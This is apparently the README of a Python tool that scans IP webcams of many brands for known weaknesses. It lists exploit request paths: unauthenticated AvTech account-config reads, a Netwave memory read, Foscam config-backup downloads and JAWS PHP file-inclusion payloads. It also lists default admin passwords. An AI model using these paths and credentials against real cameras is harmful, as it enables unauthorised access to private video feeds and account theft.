# camcheckr

Tool for Reconnaissance on a webcam.

### Use

>	 python3 camcheckr.py -u http://url/   
 
	usage: camchecker.py [-h] [-u URL]   
	optional arguments:  
	-h, --help  show this help message and exit  
	-u URL      URL to scan [required] 

![cam](https://user-images.githubusercontent.com/29504335/103356313-def17e00-4ab0-11eb-9d60-06cf9c2919fc.PNG)

### Features:

- [x] Display default password of the camera    
- [x] Exploit different vulnerabilities (without impact the camera)   
- [x] Multiple websites/IPs     

### TODO

- [ ] Multi threading
- [~] Known exploit (without impact the camera)
- [~] Auto test default password of the camera

### Cameras

Today the tool support

>
	Hikvision  
	AVTECH   
	Geovision   
	Dahua Storm   
	AXIS   
	INSTAR   
	MOBOTIX   
	Ossia (Provision SR)   
	Trendnet  
	JAWS Web Server  
	D-Link   
	Vivotek  
	INSTAR Full-HD  
	Bosch Security Systems  
	motionEye  
	Netwave  
	Netcam  
	FOSCAM   
	Domoticz     
	Bbox   
	Jeedom   
	TAS-Tech   

>

### Vulnerabilities

Today the tool found and can exploit these vulnerabilites

>
	[Netcam]   
	- /anony/mjpg.cgi  
	[Netwave]   
	- //proc/kcore  
	[AvTech]   
	- cgi-bin/nobody/Machine.cgi?action=get_capability   
	- cgi-bin/user/Config.cgi?.cab&action=get&category=Account.*   
	- cgi-bin/user/Config.cgi?/nobody&action=get&category=Account.*   
	[TAS-Tech]   
	- user.html   
	[Foscam]
	- tmpfs/config_backup.bin
	- tmpfs/config_restore.bin
	- tmpfs/ddns.conf
	- tmpfs/syslog.txt
	- log/syslog.txt
	[JAWS]
	- jaws/libraries/pear/MDB2.php?file_name=data://text/plain;base64,RXhwbG9pdCBEYXRhVVJJIGluY2x1c2lvbg==  
    - jaws/libraries/pear/MDB2.php?file_name=data://text/plain;base64,RXhwbG9pdCBEYXRhVVJJIGluY2x1c2lvbg==   
    - jaws/libraries/pear/Services/Weather.php?service=data://text/plain;base64,RXhwbG9pdCBEYXRhVVJJIGluY2x1c2lvbg==   
    - jaws/libraries/pear/SOAP/Transport.php?transport_include=data://text/plain;base64,RXhwbG9pdCBEYXRhVVJJIGluY2x1c2lvbg==   
    - jaws/libraries/pear/Crypt/RSA/MathLoader.php?class_filename=data://text/plain;base64,RXhwbG9pdCBEYXRhVVJJIGluY2x1c2lvbg==   

>

### Default credentials

Today the tool auto check these defaults credentials

>
	Avtech :
		- admin:admin
    HikVision: 
    	- admin:12345
    Geovision: 
    	- admin:admin